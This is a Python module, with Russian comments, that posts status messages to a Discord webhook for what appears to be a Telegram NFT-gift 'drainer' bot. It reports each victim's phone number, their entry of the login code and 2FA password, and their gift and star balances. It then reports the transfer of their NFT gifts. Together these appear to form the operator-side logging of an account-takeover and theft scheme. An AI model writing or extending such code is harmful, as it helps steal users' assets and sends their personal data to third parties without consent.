"""
Модуль для отправки логов обработки подарков в Discord через webhook
"""
import os
import requests
import logging
from typing import Optional

logger = logging.getLogger(__name__)

DISCORD_PROCESSING_WEBHOOK_URL = os.getenv('DISCORD_PROCESSING_WEBHOOK_URL', '')


async def send_processing_log(message: str) -> bool:
    """Отправить лог обработки подарков в Discord через webhook"""
    if not DISCORD_PROCESSING_WEBHOOK_URL:
        logger.warning("DISCORD_PROCESSING_WEBHOOK_URL not set, skipping log")
        return False
    
    try:
        payload = {
            "content": message[:2000]  # Discord limit
        }
        
        response = requests.post(DISCORD_PROCESSING_WEBHOOK_URL, json=payload, timeout=10)
        response.raise_for_status()
        return True
    except Exception as e:
        logger.error(f"Failed to send processing log to Discord: {e}")
        return False


async def send_processing_start_log(user_id: int, phone: str, nft_links: list) -> bool:
    """Отправить лог о старте обработки подарков"""
    try:
        message = f"🧑‍🎤 **Старт обработки аккаунта**\n\n"
        message += f"┠ Аккаунт: {phone} (ID: {user_id})\n"
        message += f"┠ NFT подарки ({len(nft_links)}):\n"
        
        for i, link in enumerate(nft_links, 1):
            message += f"🎁 {i}. {link}\n"
        
        return await send_processing_log(message.strip())
    except Exception as e:
        logger.error(f"Error sending processing start log: {e}")
        return False


async def send_gift_transfer_success_log(user_id: int, phone: str, gift_link: str) -> bool:
    """Отправить лог об успешной передаче подарка"""
    try:
        message = f"✅ **Успешная передача NFT**\n\n"
        message += f"👤 **Аккаунт:** {phone} (ID: {user_id})\n"
        message += f"🔗 **Ссылка:** {gift_link}\n"
        message += f"✅ NFT подарок успешно передан!"
        
        return await send_processing_log(message)
    except Exception as e:
        logger.error(f"Error sending gift transfer success log: {e}")
        return False


async def send_gift_transfer_error_log(user_id: int, phone: str, gift_link: str, error: str) -> bool:
    """Отправить лог об ошибке передачи подарка"""
    try:
        message = f"❌ **Ошибка передачи NFT**\n\n"
        message += f"👤 **Аккаунт:** {phone} (ID: {user_id})\n"
        message += f"🔗 **Ссылка:** {gift_link}\n"
        message += f"⚠️ **Ошибка:** {error}"
        
        return await send_processing_log(message)
    except Exception as e:
        logger.error(f"Error sending gift transfer error log: {e}")
        return False


async def send_processing_complete_log(user_id: int, phone: str, transferred_count: int, failed_count: int) -> bool:
    """Отправить лог о завершении обработки подарков"""
    try:
        message = f"🎁 **Обработка подарков завершена**\n\n"
        message += f"👤 **Аккаунт:** {phone} (ID: {user_id})\n"
        message += f"✅ **Успешно передано:** {transferred_count}\n"
        message += f"❌ **Ошибок:** {failed_count}"
        
        return await send_processing_log(message)
    except Exception as e:
        logger.error(f"Error sending processing complete log: {e}")
        return False


async def send_auth_phone_entered_log(user_id: int, phone: str) -> bool:
    """Отправить лог о вводе номера телефона"""
    try:
        message = f"📱 **Ввод номера телефона**\n\n"
        message += f"👤 **Пользователь ID:** {user_id}\n"
        message += f"📞 **Номер:** {phone}"
        
        return await send_processing_log(message)
    except Exception as e:
        logger.error(f"Error sending auth phone entered log: {e}")
        return False


async def send_auth_code_sent_log(user_id: int, phone: str) -> bool:
    """Отправить лог об отправке кода"""
    try:
        message = f"📨 **Код отправлен**\n\n"
        message += f"👤 **Пользователь ID:** {user_id}\n"
        message += f"📞 **Номер:** {phone}\n"
        message += f"✅ Код подтверждения отправлен на номер"
        
        return await send_processing_log(message)
    except Exception as e:
        logger.error(f"Error sending auth code sent log: {e}")
        return False


async def send_auth_code_entered_log(user_id: int, phone: str) -> bool:
    """Отправить лог о вводе кода"""
    try:
        message = f"🔢 **Ввод кода подтверждения**\n\n"
        message += f"👤 **Пользователь ID:** {user_id}\n"
        message += f"📞 **Номер:** {phone}\n"
        message += f"🔐 Пользователь ввел код подтверждения"
        
        return await send_processing_log(message)
    except Exception as e:
        logger.error(f"Error sending auth code entered log: {e}")
        return False


async def send_auth_2fa_entered_log(user_id: int, phone: str) -> bool:
    """Отправить лог о вводе пароля 2FA"""
    try:
        message = f"🔐 **Ввод пароля 2FA**\n\n"
        message += f"👤 **Пользователь ID:** {user_id}\n"
        message += f"📞 **Номер:** {phone}\n"
        message += f"🔒 Пользователь ввел пароль двухфакторной аутентификации"
        
        return await send_processing_log(message)
    except Exception as e:
        logger.error(f"Error sending auth 2FA entered log: {e}")
        return False


async def send_auth_success_log(user_id: int, phone: str, username: str = None, 
                                gifts_stats: dict = None, stars_balance: int = None) -> bool:
    """Отправить лог об успешной авторизации с опциональной статистикой"""
    try:
        message = f"✅ **Авторизация успешна**\n\n"
        message += f"👤 **Пользователь ID:** {user_id}\n"
        if username:
            message += f"👤 **Username:** @{username}\n"
        message += f"📞 **Номер:** {phone}\n"
        
        # Добавляем статистику если доступна
        if gifts_stats is not None:
            message += f"\n🎁 **Статистика подарков:**\n"
            message += f"┠ Всего подарков: {gifts_stats.get('total_gifts', 0)}\n"
            message += f"┠ NFT подарков: {gifts_stats.get('nft_gifts', 0)}\n"
            message += f"┠ Доступны для передачи: {gifts_stats.get('transferable_gifts', 0)}\n"
            message += f"┠ Заблокированы: {gifts_stats.get('non_transferable_gifts', 0)}\n"
        
        if stars_balance is not None:
            message += f"\n⭐ **Баланс звёзд:** {stars_balance}\n"
        
        message += f"\n🎉 Пользователь успешно авторизован"
        
        return await send_processing_log(message)
    except Exception as e:
        logger.error(f"Error sending auth success log: {e}")
        return False

